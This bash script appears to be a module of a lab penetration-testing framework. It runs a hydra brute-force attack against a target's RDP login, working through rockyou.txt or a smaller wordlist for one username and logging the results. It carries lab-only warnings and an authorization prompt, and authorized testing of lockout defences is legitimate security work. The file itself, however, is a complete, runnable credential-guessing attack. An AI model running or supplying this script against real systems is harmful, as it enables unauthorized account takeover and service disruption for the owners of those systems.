#!/bin/bash
# ==========================================================
# modules/win/attack1_brute.sh
# CONTROLLED / ACTIVE — LAB ONLY
#
# Objective: RDP credential brute-force testing against an authorized
# lab target, to demonstrate weak-credential exposure and (optionally)
# validate lockout/rate-limiting defenses.
# Tools: hydra
#
# This module intentionally sends real login attempts. Only use it
# against a target you own or are explicitly authorized to test.
# ==========================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../common.sh"

# Resolve wordlist relative to project root, not a hardcoded absolute
# path — makes the project portable across machines/usernames.
# Prefers rockyou.txt if present, falls back to wordlist_small.txt.
resolve_wordlist() {
    if [ -f "$SENTRYNET_ROOT/rockyou.txt" ]; then
        echo "$SENTRYNET_ROOT/rockyou.txt"
    elif [ -f "$SENTRYNET_ROOT/wordlist_small.txt" ]; then
        echo "$SENTRYNET_ROOT/wordlist_small.txt"
    else
        echo ""
    fi
}

run_brute() {
    local TARGET="$1"
    check_deps hydra

    local WORDLIST
    WORDLIST=$(resolve_wordlist)
    if [ -z "$WORDLIST" ]; then
        error "No wordlist found. Place rockyou.txt or wordlist_small.txt in $SENTRYNET_ROOT"
        return 1
    fi

    read -rp "Enter username to test (must be authorized for this lab): " username
    if [ -z "$username" ]; then
        error "Username cannot be empty."
        return 1
    fi

    local LOGFILE
    LOGFILE=$(log_path "win_brute")

    if command -v figlet >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then
        figlet "Attack 1" | lolcat
    fi
    info "Target: $TARGET  |  Service: RDP"
    info "Username: $username  |  Wordlist: $WORDLIST"
    warn "This module sends real login attempts against the target."

    info "Launching Hydra..."
    echo ""
    hydra -l "$username" -P "$WORDLIST" "rdp://$TARGET" -t 4 -V | tee "$LOGFILE"

    echo ""
    ok "Attack sequence complete. Results: $LOGFILE"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    TARGET=$(prompt_target)
    confirm_authorization "$TARGET" || exit 1
    run_brute "$TARGET"
fi
